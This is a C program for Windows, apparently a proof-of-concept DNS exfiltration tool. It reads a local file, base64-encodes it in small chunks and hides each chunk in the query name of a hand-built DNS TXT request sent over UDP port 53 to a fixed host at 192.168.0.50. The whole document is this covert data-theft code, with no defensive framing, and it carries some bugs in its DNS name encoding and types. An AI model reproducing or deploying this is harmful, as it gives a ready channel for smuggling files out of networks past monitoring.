#include "base64.h"
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <conio.h>
#pragma comment(lib, "ws2_32")
#define BUFLEN 65536
#define CHUNKSIZE 25
struct dns_header
{
    unsigned short id; // identification number

    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag

    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available

    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};

struct question{
    unsigned short type;
    unsigned short tclass;
};

typedef struct
{
    unsigned char *name;
    struct question *ques;
} query;


void sendFile(char * file){

    SOCKET sock;
    WSADATA wsa;
    SOCKADDR_IN ReceiverAddr , SrcInfo;
    SOCKADDR_IN SenderAddr;
    int slen = sizeof(ReceiverAddr) ;
    int port = 53;


	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0){
		printf("Failed. Error Code : %d",WSAGetLastError());
		return 1;
	}

    if((sock = socket(AF_INET , SOCK_DGRAM, IPPROTO_UDP )) == INVALID_SOCKET){
        printf("Could not create socket : %d" , WSAGetLastError());
    }

    ReceiverAddr.sin_family = AF_INET;
    ReceiverAddr.sin_port = htons(port);
    ReceiverAddr.sin_addr.s_addr = inet_addr("192.168.0.50");


    unsigned char buf[65536],*qname,*reader;

    struct question *qinfo = NULL;
    struct dns_header *dns = NULL;

    // DNS QUERY HEADERS SETUP
    dns = (struct dns_header *)&buf;
    dns->id = (unsigned short) htons(getpid());
    dns->qr = 0; //This is a query
    dns->opcode = 0; //This is a standard query
    dns->aa = 0; //Not Authoritative
    dns->tc = 0; //This message is not truncated
    dns->rd = 1; //Recursion Desired
    dns->ra = 0; //Recursion not available! hey we dont have it (lol)
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->q_count = htons(1); //we have only 1 question
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = 0;


    DWORD  dwBytesRead = 0;
    char   ReadBuffer[CHUNKSIZE] = {0};
    int err;
    short totalBytesRead = 0;
    int r = 0;
    size_t i = 0;
    HANDLE hFile = CreateFile(file   ,            // file to open
                       GENERIC_READ,          // open for read
                       FILE_SHARE_READ,       // share for read
                       NULL,                  // default security
                       OPEN_EXISTING,         // existing file only
                       FILE_ATTRIBUTE_NORMAL, // normal file
                       NULL);
    int fsize = GetFileSize(hFile, NULL);

    while(totalBytesRead < fsize){

            ReadFile(hFile, ReadBuffer, CHUNKSIZE-1, &dwBytesRead, NULL);
            char *res= base64_encode(ReadBuffer,dwBytesRead,&i);
            char message[i+1];
            message[0] = i;
            strncpy(message+1,res,i+1);

            // DNS QUESTION
            qname =(unsigned char*)&buf[sizeof(struct dns_header)];
            strncpy(qname, message, i+1);

            // UPDATE THE QUERY BUFFER
            qinfo =(struct question*)&buf[sizeof(struct dns_header) + (strlen((const char*)qname) + 1)];
            // SET CLASS
            qinfo->type = htons(16); // 1 == 'A', 16 == 'TXT', we ask for TXT registers
            qinfo->tclass = htons(1); // 1 = INTERNET

            if (sendto(sock,(char*)buf,sizeof(struct dns_header) + (strlen((const char*)qname)+1) + sizeof(struct question) , 0 , (struct SOCKADDR *) &ReceiverAddr, slen) == SOCKET_ERROR){
                printf("sendto() failed with error code : %d ", WSAGetLastError());
                exit(EXIT_FAILURE);
            }
            else{
                printf("%d bytes now sent\n", totalBytesRead);
            }
            sleep(1);
            totalBytesRead += dwBytesRead;
    }
}

int main()
{

    char * file = "C:\\samples\\newfile.txt";
    printf("Hello base64!, now sending: %s \n", file);
    sendFile(file);

    return 0;
}
